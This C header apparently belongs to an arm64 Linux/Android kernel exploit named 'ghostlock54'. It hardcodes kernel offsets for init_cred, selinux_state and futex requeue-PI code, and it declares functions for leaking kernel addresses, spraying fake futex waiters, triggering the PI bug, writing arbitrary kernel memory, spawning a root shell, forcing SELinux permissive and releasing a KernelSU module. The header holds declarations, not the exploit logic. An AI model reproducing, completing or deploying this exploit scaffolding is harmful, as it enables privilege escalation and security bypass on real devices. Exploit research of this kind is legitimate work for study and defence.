#ifndef GHOSTLOCK54_COMMON_H
#define GHOSTLOCK54_COMMON_H

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <linux/futex.h>
#include <linux/capability.h>
#include <linux/perf_event.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <ucontext.h>
#include <unistd.h>
#include <time.h>

/* ---------------- logging ---------------- */
#define COLOR_GREEN "\033[32m"
#define COLOR_RED   "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define pr_error(fmt, ...) do { \
        printf(COLOR_RED "[!] " COLOR_DEFAULT fmt, ##__VA_ARGS__); fflush(stdout); \
        exit(-1); \
    } while (0)
#define pr_warning(fmt, ...) do { \
        printf(COLOR_RED "[-] " COLOR_DEFAULT fmt, ##__VA_ARGS__); \
    } while (0)
#define pr_info(fmt, ...) do { \
        printf(COLOR_YELLOW "[*] " COLOR_DEFAULT fmt, ##__VA_ARGS__); \
    } while (0)
#define pr_success(fmt, ...) do { \
        printf(COLOR_GREEN "[+] " COLOR_DEFAULT fmt, ##__VA_ARGS__); \
    } while (0)

#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

#define WAIT_UNTIL(cond, timeout_ms, what) do { \
    struct timespec _s, _n; clock_gettime(CLOCK_MONOTONIC, &_s); \
    for (;;) { \
      if (cond) break; \
      clock_gettime(CLOCK_MONOTONIC, &_n); \
      long _el = (_n.tv_sec - _s.tv_sec) * 1000L + \
                 (_n.tv_nsec - _s.tv_nsec) / 1000000L; \
      if (_el > (timeout_ms)) pr_error("timeout: %s\n", what); \
      sched_yield(); \
    } \
  } while (0)

/* ---------------- kernel offsets ---------------- */
#define LINK_TEXT UINT64_C(0xffffffc010080000)
#define OFF_INIT_TASK UINT64_C(0x2ca2800)
#define OFF_INIT_CRED UINT64_C(0x2caf850)
#define OFF_SELINUX_STATE UINT64_C(0x2f07000)
#define OFF_LOG_BUF UINT64_C(0x2f1e0b4)
#define OFF_TASK_STATE UINT64_C(0x593324)
#define OFF_FUTEX_WAIT_REQUEUE_PI UINT64_C(0x358d64)
#define OFF_SEL_READ_ENFORCE UINT64_C(0x70ccec)
#define ARM64_REG_COUNT 33
#define ARM64_REG_MASK ((UINT64_C(1) << ARM64_REG_COUNT) - 1)

#define FUTEX_PRIVATE 128
#define LOCK_PI_PRIVATE (FUTEX_LOCK_PI | FUTEX_PRIVATE)
#define UNLOCK_PI_PRIVATE (FUTEX_UNLOCK_PI | FUTEX_PRIVATE)
#define WAIT_REQUEUE_PI_PRIVATE (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE)
#define CMP_REQUEUE_PI_PRIVATE (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE)

/* ---------------- globals ---------------- */
extern struct timespec t_start;
extern uint64_t runtime_text;
extern uint64_t k_init_task;
extern uint64_t k_selinux_state;
extern uint64_t k_write_value;
extern uint64_t k_fake_lock;
extern uint64_t k_fake_lock2;
extern uint64_t k_ghost_task;
extern uint64_t k_current_task;
extern uint64_t k_current_cred;
extern uint64_t k_y_task;
extern uint64_t k_waiter;
extern int __orig_stdout;
extern pid_t process_pid;
extern atomic_uintptr_t stamp_parent, stamp_value, stamp_lock;
extern atomic_int stamp_done, stamp_status;
extern int pi1, pi2, cond;
extern atomic_int y_locked_l2, x_locked_l1, y_parking, x_blocking;
extern atomic_int y_done, y_cleanup, x_done, y_tid;
extern atomic_int y_task_ready;
extern atomic_int respray_ready, respray_done;
extern atomic_uintptr_t respray_parent, respray_value, respray_lock;
extern unsigned fake_lock_index;
extern int y_leak_only;
extern char g_module_path[256];
extern int g_leak_only;
extern int g_shell_mode;
extern int g_force_release;
extern int g_permissive_only;
extern char g_shell_path[256];

/* ---------------- prototypes ---------------- */
void timer_reset(void);
double timer_ms(void);
int wait_atomic_ms(atomic_int *v, long ms);
void log_context(const char *tag);
int read_enforce(void);
long raw_futex(volatile int *u1, long op, long val, long val2,
               volatile int *u2, long val3);
long raw_sched_setscheduler(int tid, int policy, struct sched_param *param);
uint64_t ring_u64(const uint8_t *ring, uint64_t size, uint64_t pos);
uint64_t leak_text(void);
uint64_t leak_task_from_status(const char *status_path, uint64_t *cred_out);
uint64_t leak_syscall_sp(void);
uint64_t leak_selinux_state(void);
void cpu_yield(void);
struct k_fpsimd_context *find_fpsimd(unsigned char *p, unsigned char *end);
void sigusr2(int sig, siginfo_t *info, void *opaque);
int stamp_waiter(uint64_t parent, uint64_t value, uint64_t lock);
void sigusr1(int sig);
void *thread_y(void *unused);
void *thread_x(void *unused);
long trigger_pi(void);
int write_value(uint64_t target, uint64_t value);
const char *path_basename(const char *p);
void ksu_release_module(void);
void ksu_release_script(void);
void usage(const char *prog);

#endif
